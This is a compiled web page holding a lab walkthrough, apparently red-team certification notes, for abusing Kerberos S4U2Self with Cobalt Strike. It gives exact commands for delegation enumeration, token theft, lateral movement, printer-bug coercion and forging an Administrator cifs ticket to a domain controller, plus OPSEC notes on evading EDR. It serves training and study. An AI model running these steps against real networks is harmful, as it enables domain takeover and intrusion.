import{_ as t,o,c as s,am as a}from"./chunks/framework.yj4qiWdr.js";const u=JSON.parse('{"title":"S4U2Self Lab","description":"","frontmatter":{},"headers":[],"relativePath":"crto/botesjuan/labs/S4U2self-lab.md","filePath":"crto/botesjuan/labs/S4U2self-lab.md"}'),n={name:"crto/botesjuan/labs/S4U2self-lab.md"};function i(c,e,l,r,d,p){return o(),s("div",null,e[0]||(e[0]=[a(`<h1 id="s4u2self-lab" tabindex="-1">S4U2Self Lab <a class="header-anchor" href="#s4u2self-lab" aria-label="Permalink to &quot;S4U2Self Lab&quot;">​</a></h1><blockquote><p>The objective for this lab is to demonstrate how to abuse S4U2self with the TGT for a computer account.</p></blockquote><p><strong>Concept:</strong> S4U2Self allows a service to request a service ticket to <em>itself</em> on behalf of any user — no user TGT or password needed. Combined with unconstrained delegation and a coercion trigger <code>SpoolSample</code>, you capture the DC machine account TGT, then use <code>krb_s4u /self</code> to generate a usable <code>cifs</code> service ticket impersonating a Domain Admin. The DC machine account TGT alone cannot be used for file access — S4U2Self bridges that gap.</p><p>===</p><h2 id="enumeration" tabindex="-1">Enumeration <a class="header-anchor" href="#enumeration" aria-label="Permalink to &quot;Enumeration&quot;">​</a></h2><ol><li><p>Launch Cobalt Strike and connect to the team server.</p></li><li><p>Find computers configured with unconstrained delegation (excludes DCs — not a viable attack path):</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName</span></span></code></pre></div><blockquote><p>OPSEC-🟢SAFE — BOF, runs in beacon thread, no child process.</p></blockquote></li></ol><p>⚠️ Expected result: <code>lon-ws-1$</code> — the unconstrained delegation host you will pivot through.</p><ol start="3"><li>Impersonate the <em>rsteel</em> user and move laterally to <code>lon-ws-1</code>.</li></ol><p>===</p><h2 id="lateral-movement-to-lon-ws-1" tabindex="-1">Lateral Movement to lon-ws-1 <a class="header-anchor" href="#lateral-movement-to-lon-ws-1" aria-label="Permalink to &quot;Lateral Movement to lon-ws-1&quot;">​</a></h2><p>Goal: get a beacon on <code>lon-ws-1</code>. SYSTEM is <strong>not</strong> strictly required for this lab — Rubeus monitor runs via execute-assembly. However, winrm64 lands as <code>rsteel</code> (not SYSTEM), so <code>getsystem</code> is needed before running Rubeus monitor, followed by <code>rev2self</code> (see Step 1 note below).</p><h3 id="option-a-—-steal-token-preferred-opsec-🟢safe" tabindex="-1">Option A — steal_token (preferred, OPSEC-🟢SAFE) <a class="header-anchor" href="#option-a-—-steal-token-preferred-opsec-🟢safe" aria-label="Permalink to &quot;Option A — steal_token (preferred, OPSEC-🟢SAFE)&quot;">​</a></h3><ol><li><p>On the existing beacon, run <code>ps</code> or <code>process_browser</code> and find a process owned by <code>rsteel</code>:</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ps</span></span></code></pre></div><p>Look for <code>cmd.exe</code> or <code>mmc.exe</code> owned by <code>CONTOSO\\rsteel</code>.</p></li><li><p>Steal the token:</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>steal_token &lt;rsteel-pid&gt;</span></span></code></pre></div><blockquote><p>OPSEC-🟢SAFE — token duplication in beacon thread, no logon event, no child process.</p></blockquote></li><li><p>Set spawnto before jumping:</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ak-settings spawnto_x64 C:\\Windows\\System32\\dllhost.exe</span></span></code></pre></div><blockquote><p>OPSEC-🟠CAUTION — sets the sacrificial process for fork &amp; run. <code>dllhost.exe</code> blends with COM surrogate activity.</p></blockquote></li><li><p>Jump to lon-ws-1:</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>jump winrm64 lon-ws-1 smb_custom</span></span></code></pre></div><blockquote><p>OPSEC-🟢SAFE — WinRM, no service modification, no disk write, no Event 7045.</p></blockquote></li><li><p>Drop token on source beacon after jump succeeds:</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>rev2self</span></span></code></pre></div></li></ol><h3 id="option-b-—-make-token-kerberos-ticket-use-when-no-rsteel-process-visible" tabindex="-1">Option B — make_token + kerberos_ticket_use (when no rsteel process visible) <a class="header-anchor" href="#option-b-—-make-token-kerberos-ticket-use-when-no-rsteel-process-visible" aria-label="Permalink to &quot;Option B — make_token + kerberos_ticket_use (when no rsteel process visible)&quot;">​</a></h3><ol><li><p>Dump rsteel&#39;s TGT from the cached session:</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>krb_triage</span></span>
<span class="line"><span>krb_dump /user:rsteel /service:krbtgt</span></span></code></pre></div><blockquote><p>OPSEC-🟠CAUTION — Kerberos API call via <code>LsaCallAuthenticationPackage</code>. No raw LSASS read.</p></blockquote></li><li><p>Write the base64 TGT to a <code>.kirbi</code> file on the <strong>attacker desktop</strong> (local PowerShell — not via beacon):</p><div class="language-powershell vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">IO.File</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::WriteAllBytes(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;C:\\Users\\Attacker\\Desktop\\rsteel.kirbi&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">,</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;"> [</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">Convert</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::FromBase64String(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;[BASE64-TGT]&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">))</span></span></code></pre></div><blockquote><p>⚠️ Lab-confirmed (2026-04-19): <code>kerberos_ticket_use</code> requires a <strong>file path</strong> — pasting base64 directly fails with <code>does not exist</code> error.</p></blockquote></li><li><p>Create a fake logon session and inject the TGT:</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>make_token CONTOSO\\rsteel FakePass</span></span>
<span class="line"><span>kerberos_ticket_use C:\\Users\\Attacker\\Desktop\\rsteel.kirbi</span></span></code></pre></div><blockquote><p>OPSEC-🟠CAUTION — <code>make_token</code> generates Event 4648.</p></blockquote></li><li><p>Jump to lon-ws-1:</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>jump winrm64 lon-ws-1 smb_custom</span></span></code></pre></div></li><li><p>Drop token and purge on source beacon:</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>rev2self</span></span>
<span class="line"><span>kerberos_ticket_purge</span></span></code></pre></div></li></ol><h3 id="on-the-new-lon-ws-1-beacon" tabindex="-1">On the new lon-ws-1 beacon <a class="header-anchor" href="#on-the-new-lon-ws-1-beacon" aria-label="Permalink to &quot;On the new lon-ws-1 beacon&quot;">​</a></h3><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>getuid</span></span></code></pre></div><blockquote><p>⚠️ Lab-confirmed (2026-04-19): <code>jump winrm64</code> lands as <code>CONTOSO\\rsteel</code> (not SYSTEM) — WinRM injects into <code>wsmprovhost.exe</code> running as the authenticated user. SYSTEM context is needed before running Rubeus monitor. Use <code>getsystem</code>:</p></blockquote><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>getsystem</span></span>
<span class="line"><span>getuid    # confirm NT AUTHORITY\\SYSTEM</span></span></code></pre></div><blockquote><p>OPSEC-🟠CAUTION — getsystem uses named pipe impersonation from admin context.</p></blockquote><p>===</p><h2 id="exploitation" tabindex="-1">Exploitation <a class="header-anchor" href="#exploitation" aria-label="Permalink to &quot;Exploitation&quot;">​</a></h2><h3 id="step-1-—-start-rubeus-monitor-on-lon-ws-1" tabindex="-1">Step 1 — Start Rubeus monitor on lon-ws-1 <a class="header-anchor" href="#step-1-—-start-rubeus-monitor-on-lon-ws-1" aria-label="Permalink to &quot;Step 1 — Start Rubeus monitor on lon-ws-1&quot;">​</a></h3><p>Monitors for incoming TGTs via SSPI as they arrive — no LSASS memory read.</p><blockquote><p>⚠️ Lab-confirmed (2026-04-19): <code>execute-assembly</code> <strong>fails with &quot;No .NET runtime found&quot;</strong> immediately after <code>getsystem</code>. The getsystem impersonation token breaks the fork-and-run .NET host. Fix: <code>rev2self</code> first, then run Rubeus monitor:</p></blockquote><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>rev2self</span></span>
<span class="line"><span>execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap</span></span></code></pre></div><blockquote><p>OPSEC-🟠CAUTION — fork &amp; run into <code>dllhost.exe</code> (spawnto set above). Ticket capture itself uses Windows SSPI/Kerberos API — no direct LSASS read. <code>/targetuser</code> filters output to the DC machine account only, reducing noise.</p></blockquote><blockquote><p>⚠️ After rev2self you will be back to <code>rsteel</code> context — that is fine. Rubeus monitor runs in the sacrificial process and captures tickets regardless of the beacon&#39;s impersonation state.</p></blockquote><hr><h3 id="step-2-—-coerce-lon-dc-1-to-authenticate-to-lon-ws-1" tabindex="-1">Step 2 — Coerce lon-dc-1 to authenticate to lon-ws-1 <a class="header-anchor" href="#step-2-—-coerce-lon-dc-1-to-authenticate-to-lon-ws-1" aria-label="Permalink to &quot;Step 2 — Coerce lon-dc-1 to authenticate to lon-ws-1&quot;">​</a></h3><p>Triggers the Print Spooler service on <code>lon-dc-1</code> via MS-RPRN to send its TGT to <code>lon-ws-1</code>.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\SharpSystemTriggers\\SharpSpoolTrigger\\bin\\Release\\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1</span></span></code></pre></div><blockquote><p>OPSEC-🟠CAUTION — fork &amp; run. Generates a 4648 logon event on <code>lon-dc-1</code> and MS-RPRN RPC traffic. Print Spooler must be running on the DC.</p></blockquote><blockquote><p>⚠️ Lab-confirmed (2026-04-19): SharpSpoolTrigger may return <code>[-]RpcRemoteFindFirstPrinterChangeNotificationEx status: 6</code> (ERROR_INVALID_HANDLE) on both attempts. Despite this error, Rubeus monitor <strong>still captured the DC TGT</strong> — the unconstrained delegation host receives the TGT from any prior DC authentication, not only from the coercion trigger. If Rubeus monitor shows a TGT for <code>lon-dc-1$</code>, proceed regardless of SpoolTrigger error.</p></blockquote><p>⚠️ Rubeus monitor output should capture the TGT of <code>LON-DC-1$</code>. Copy the full base64 ticket string — paste it <strong>directly into the <code>krb_s4u</code> command</strong> below. No file write needed at this stage.</p><hr><h3 id="step-3-—-s4u2self-to-obtain-a-usable-cifs-service-ticket" tabindex="-1">Step 3 — S4U2Self to obtain a usable cifs service ticket <a class="header-anchor" href="#step-3-—-s4u2self-to-obtain-a-usable-cifs-service-ticket" aria-label="Permalink to &quot;Step 3 — S4U2Self to obtain a usable cifs service ticket&quot;">​</a></h3><p>The DC machine account TGT cannot be used directly for file access. Use <code>krb_s4u /self</code> to convert it into a <code>cifs</code> service ticket impersonating Administrator.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>krb_s4u /ticket:[paste-base64-DC-TGT-here] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator</span></span></code></pre></div><blockquote><p>OPSEC-🟢SAFE — <code>krb_s4u</code> is a BOF. Runs in beacon thread, no child process, no disk write.</p></blockquote><blockquote><p>⚠️ Lab-confirmed (2026-04-19): This command succeeded. Output confirms:</p><ul><li><code>[*] Building S4U2self request for: &#39;LON-DC-1$@CONTOSO.COM&#39;</code></li><li><code>[+] S4U2self success!</code></li><li><code>[*] Substituting alternative service name &#39;cifs/lon-dc-1&#39;</code></li><li><code>[*] Got a TGS for &#39;Administrator&#39; to &#39;cifs@CONTOSO.COM&#39;</code></li></ul></blockquote><p>⚠️ <code>krb_s4u</code> outputs a <strong>new</strong> base64-encoded service ticket (this is a different ticket to the DC TGT). Copy this new base64 string — this one gets written to the <code>.kirbi</code> file in Step 4.</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>Rubeus monitor output  →  base64 DC TGT       →  paste into krb_s4u</span></span>
<span class="line"><span>krb_s4u output         →  base64 cifs ticket  →  WriteAllBytes → .kirbi → kerberos_ticket_use</span></span></code></pre></div><hr><h3 id="step-4-—-save-the-service-ticket-on-the-attacker-machine" tabindex="-1">Step 4 — Save the service ticket on the attacker machine <a class="header-anchor" href="#step-4-—-save-the-service-ticket-on-the-attacker-machine" aria-label="Permalink to &quot;Step 4 — Save the service ticket on the attacker machine&quot;">​</a></h3><p>Run this on the attacker CS client (local PowerShell — <strong>not</strong> via beacon):</p><div class="language-powershell vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">IO.File</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::WriteAllBytes(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;C:\\Users\\Attacker\\Desktop\\cifs-lon-dc-1.kirbi&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">,</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;"> [</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">Convert</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::FromBase64String(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;[BASE64-SERVICE-TICKET]&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">))</span></span></code></pre></div><blockquote><p>The <code>.kirbi</code> file is written to your <strong>attacker desktop only</strong> — nothing touches the target&#39;s disk. <code>kerberos_ticket_use</code> reads from the CS client and injects over the C2 channel.</p></blockquote><blockquote><p>⚠️ Lab-confirmed (2026-04-19): <code>kerberos_ticket_use</code> requires a <strong>file path</strong> — attempting to pass the raw base64 string directly fails with error <code>&#39;C:\\Tools\\cobaltstrike\\client\\[base64...]&#39; does not exist</code>. Always write the <code>.kirbi</code> file first, then reference the file path.</p></blockquote><hr><h3 id="step-5-—-inject-the-ticket-and-access-the-share" tabindex="-1">Step 5 — Inject the ticket and access the share <a class="header-anchor" href="#step-5-—-inject-the-ticket-and-access-the-share" aria-label="Permalink to &quot;Step 5 — Inject the ticket and access the share&quot;">​</a></h3><p>Back in the beacon on <strong><code>lon-ws-1</code></strong> (not lon-dc-1 — you are accessing it remotely via the ticket):</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>// Option A — skip make_token (OPSEC-🟢SAFE — no Event 4648, preferred)</span></span>
<span class="line"><span>kerberos_ticket_use C:\\Users\\Attacker\\Desktop\\cifs-lon-dc-1.kirbi</span></span>
<span class="line"><span>ls \\\\lon-dc-1\\c$</span></span>
<span class="line"><span></span></span>
<span class="line"><span>// Option B — with make_token (OPSEC-🟠CAUTION — Event 4648, cleaner session)</span></span>
<span class="line"><span>make_token CONTOSO\\Administrator FakePass</span></span>
<span class="line"><span>kerberos_ticket_use C:\\Users\\Attacker\\Desktop\\cifs-lon-dc-1.kirbi</span></span>
<span class="line"><span>ls \\\\lon-dc-1\\c$</span></span></code></pre></div><blockquote><p>OPSEC-🟢SAFE — <code>kerberos_ticket_use</code> injects the ticket into the current logon session. <code>make_token</code> is optional — the remote server validates the Kerberos ticket content, not the local session identity.</p></blockquote><p>⚠️ <code>ls \\\\lon-dc-1\\c$</code> should succeed. If it fails with <code>ACCESS_DENIED</code>, verify:</p><ul><li><code>getuid</code> — confirm token is set</li><li><code>run klist</code> — confirm the <code>cifs/lon-dc-1</code> ticket is present in the session (note: <code>run klist</code> spawns a child process — acceptable for quick verification only)</li><li>The SPN in <code>krb_s4u</code> exactly matches <code>cifs/lon-dc-1</code></li></ul><p>Drop impersonation and purge ticket when done:</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>rev2self</span></span>
<span class="line"><span>kerberos_ticket_purge</span></span></code></pre></div><p>===</p><p>⚠️ In this lab, you have learned how to combine unconstrained delegation, remote authentication triggers, and S4U2Self to compromise domain controller <code>lon-dc-1</code> — converting an unusable DC machine account TGT into a valid <code>cifs</code> service ticket without touching LSASS directly.</p><p>===</p><h2 id="lab-observations-2026-04-19" tabindex="-1">Lab Observations (2026-04-19) <a class="header-anchor" href="#lab-observations-2026-04-19" aria-label="Permalink to &quot;Lab Observations (2026-04-19)&quot;">​</a></h2><table tabindex="0"><thead><tr><th>Finding</th><th>Detail</th></tr></thead><tbody><tr><td><code>kerberos_ticket_use</code> rejects raw base64</td><td>Passing base64 directly fails: CS treats the string as a file path and errors with <code>does not exist</code>. Must write <code>.kirbi</code> file first.</td></tr><tr><td><code>getsystem</code> breaks <code>execute-assembly</code></td><td>After <code>getsystem</code>, Rubeus monitor fails: <code>No .NET runtime found</code>. Run <code>rev2self</code> before <code>execute-assembly</code>. The monitor job runs fine in rsteel admin context.</td></tr><tr><td><code>jump winrm64</code> lands as rsteel</td><td>WinRM injects into <code>wsmprovhost.exe</code> as the authenticated user — not SYSTEM. <code>getsystem</code> needed for SYSTEM context, but <code>rev2self</code> required before Rubeus.</td></tr><tr><td>SharpSpoolTrigger <code>status: 6</code></td><td><code>RpcRemoteFindFirstPrinterChangeNotificationEx status: 6</code> = ERROR_INVALID_HANDLE. Both coercion attempts returned this error. Rubeus monitor still captured the DC TGT from a prior natural authentication — the unconstrained host had the TGT cached already.</td></tr><tr><td><code>smb_custom</code> listener worked first attempt</td><td>No retry required with custom pipe name (vs TSVCPIPE-* default).</td></tr><tr><td><code>krb_s4u /self</code> succeeded</td><td>LON-DC-1$ TGT → <code>cifs/lon-dc-1</code> service ticket for Administrator. Confirmed S4U2self flow end-to-end.</td></tr><tr><td>EDR on lon-ws-1</td><td>Elastic Endpoint, MsMpEng, Sysmon64 present — spawnto override and custom SMB pipe required.</td></tr></tbody></table>`,63)]))}const b=t(n,[["render",i]]);export{u as __pageData,b as default};
